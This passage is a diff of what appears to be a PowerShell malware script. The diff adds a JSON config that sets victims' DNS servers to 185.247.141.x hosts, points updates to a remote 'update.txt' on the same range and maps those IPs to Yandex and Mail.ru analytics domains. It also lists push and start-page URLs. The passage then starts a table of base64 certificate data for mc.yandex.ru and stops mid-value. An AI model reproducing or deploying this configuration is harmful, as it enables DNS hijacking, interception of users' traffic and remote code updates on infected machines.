@@ -1,8 +1,41 @@
-$PrimaryDNSServer = '185.247.141.78'
-$SecondaryDNSServer = '185.247.141.51'
-$updateUrl = 'http://185.247.141.76/data/update.txt'
-$xpushes = @()
-$xstartUrls = @('                        https://yandex.ru        ')
+$xserver = '{
+    "updateUrl":  "http://185.247.141.78/dynamicdata/upd/update.txt",
+    "primaryDns":  "185.247.141.78",
+    "secondaryDns":  "185.247.141.51",
+    "track":  false,
+    "trackingUrl":  "123",
+    "autoStart":  false,
+    "autoUpdate":  false,
+    "domains":  [
+                    "mc.yandex.ru",
+                    "mc.yandex.com",
+                    "t.mail.ru",
+                    "ad.mail.ru",
+                    "counter.yadro.ru"
+                ],
+    "ipDomains":  {
+                      "185.247.141.78":  "mc.yandex.ru",
+                      "185.247.141.51":  "mc.yandex.com",
+                      "185.247.141.50":  "t.mail.ru",
+                      "185.247.141.48":  "ad.mail.ru",
+                      "185.247.141.46":  "counter.yadro.ru"
+                  },
+    "pushes":  [
+                   "https://microsoft.com",
+                   "https://rambler.ru"
+               ],
+    "startUrls":  [
+                      "https://yahoo.com",
+                      "https://msn.com"
+                  ],
+    "front":  [
+                  "write.exe"
+              ],
+    "embeddings":  [
+
+                   ],
+    "isValid":  false
+}'
 $xdata = @{
     'mc.yandex.ru'='MIIKsQIBAzCCCm0GCSqGSIb3DQEHAaCCCl4EggpaMIIKVjCCBg8GCSqGSIb3DQEHAaCCBgAEggX8MIIF+DCCBfQGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAg7b907Z/l3VAICB9AEggTYV4Gwenr9KDAv3madoOk1EeF82TazbxTdlpCswTGL'+ 
 'IAQILTlqcPV/Gmp+Rn+//oP5vTJs0rRSP2Jm1Dj5J1XH4eySKWYJGIZ7B7EMNaxtSLep+0CDRTdEgRdRUNcgzZ6q+0sXRbdrTJtgP+EY4raH36QYFc0SThhDBYUFXmORAXiMPjd4Qyvch9WBVbL4Mry7OReP9hVofX4FJ7K9I0zzY2uYCkI7eyN9OsB50bbzD8ON99lr'+ 
